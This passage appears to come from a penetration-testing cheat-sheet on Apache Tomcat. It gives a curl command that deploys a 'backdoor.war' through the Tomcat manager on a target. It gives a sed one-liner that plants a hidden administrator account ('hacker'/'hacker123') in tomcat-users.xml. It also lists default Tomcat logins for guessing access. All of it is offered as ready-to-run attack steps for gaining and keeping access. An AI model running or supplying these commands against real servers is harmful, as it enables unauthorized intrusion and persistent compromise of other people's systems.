<!-- cmd: {"id":"uoaoczkw3mptlvkap","language":"bash","sectionId":"vgcvvta6tmptlvjur","tags":["tomcat","persistence","backdoor"]} -->

### tg17mmchymptlvkav
```bash
curl -u $USER:$PASS http://$TARGET:8080/manager/text/deploy?path=/backup --upload-file backdoor.war
```

**Tags:** tomcat, persistence, backdoor
<!-- cmd: {"id":"tg17mmchymptlvkav","language":"bash","sectionId":"vgcvvta6tmptlvjur","tags":["tomcat","persistence","backdoor"]} -->

### yddh0bd06mptlvkb0
```bash
sed -i 's|</tomcat-users>|<user username="hacker" password="hacker123" roles="manager-gui,admin-gui,manager-script"/></tomcat-users>|' /opt/tomcat/conf/tomcat-users.xml
```

**Tags:** tomcat, persistence, backdoor
<!-- cmd: {"id":"yddh0bd06mptlvkb0","language":"bash","sectionId":"vgcvvta6tmptlvjur","tags":["tomcat","persistence","backdoor"]} -->

## Default Credentials
<!-- section: {"id":"3hvjeu5o7mptlvjuv","order":11,"collapsed":false} -->

### defat5uhxmptlvkbs
```bash
tomcat    : tomcat
```

_Default Credentials_

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"defat5uhxmptlvkbs","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### wi8wc9rjgmptlvkbw
```bash
tomcat    : s3cret
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"wi8wc9rjgmptlvkbw","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### qmv51lddqmptlvkc1
```bash
admin     : admin
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"qmv51lddqmptlvkc1","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### zh49nd25mmptlvkc6
```bash
admin     : password
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"zh49nd25mmptlvkc6","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### yndmjpmofmptlvkcb
```bash
admin     : (empty)
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"yndmjpmofmptlvkcb","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### qxgxlqnirmptlvkch
```bash
manager   : manager
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"qxgxlqnirmptlvkch","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### 6qiyfqak1mptlvkcl
```bash
role1     : tomcat
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"6qiyfqak1mptlvkcl","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### x7x9ywp4omptlvkcq
```bash
both      : tomcat
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"x7x9ywp4omptlvkcq","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->

### dq8rzoh1zmptlvkcw
```bash
root      : root
```

**Tags:** tomcat, default-credentials
<!-- cmd: {"id":"dq8rzoh1zmptlvkcw","language":"bash","sectionId":"3hvjeu5o7mptlvjuv","tags":["tomcat","default-credentials"]} -->
